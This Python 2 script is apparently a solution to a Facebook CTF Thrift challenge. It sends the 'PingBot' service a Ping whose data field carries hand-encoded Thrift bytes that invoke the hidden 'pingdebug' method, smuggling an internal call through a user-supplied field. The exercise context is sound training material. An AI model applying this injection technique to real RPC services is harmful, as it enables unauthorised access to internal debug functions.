#!/usr/bin/env python
import sys
sys.path.append('./gen-py')
from ping import PingBot
from ping.ttypes import *
from thrift import Thrift
from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol
try:
  # Make socket
  transport = TSocket.TSocket('challenges.fbctf.com', 9090)
  # Buffering is critical. Raw sockets are very slow
  transport = TTransport.TBufferedTransport(transport)
  # Wrap in a protocol
  protocol = TBinaryProtocol.TBinaryProtocol(transport)
  # Create a client to use the protocol encoder
  client = PingBot.Client(protocol)
  # Connect!
  transport.open()
  tmp = Ping()
  tmp.host = "54.213.13.173:9090"
  tmp.data = "\200\1\0\1\0\0\0\tpingdebug\0\0\0\0\f\0\1\0\0"
  tmp.proto=Proto().TCP
  pong = client.ping(tmp)
  print (pong)
  #print(client.pingdebug(Debug()))
  # Close!
except Thrift.TException, tx:
  print '%s' % (tx.message)
